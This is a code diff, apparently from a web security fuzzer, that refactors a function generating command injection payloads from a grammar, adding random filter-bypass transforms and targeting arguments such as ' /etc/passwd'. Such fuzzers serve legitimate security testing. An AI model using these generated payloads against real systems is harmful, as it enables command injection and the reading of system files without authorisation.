@@ -101,7 +101,7 @@ def submit_form(driver, form_details, url, value) -> dict:
     return result
 
 
-def generate_payload() -> list[str]:
+def generate_payload(count: int) -> list[str]:
     # command injection 페이로드 생성 함수
 
     payloads: list[str] = []
@@ -115,17 +115,13 @@ def generate_payload() -> list[str]:
         '<args>': [' /etc/passwd']
     }
 
-    size = 0
-    while size < 50:
-        command_injection_fuzzer = GrammarFuzzer(Command_Injection_Grammar)
+    command_injection_fuzzer = GrammarFuzzer(Command_Injection_Grammar)
+    payloads = set()
+
+    while len(payloads) < count:
         payload: str = command_injection_fuzzer.fuzz()
+        payloads.add(random.choice(bypass_functions)(payload))
 
-        if payload in payloads:
-            continue
-
-        payloads.append(random.choice(bypass_functions)(payload))
-        size += 1
-
-    payloads = list(set(payloads))
+    payloads = list(payloads)
 
     return payloads
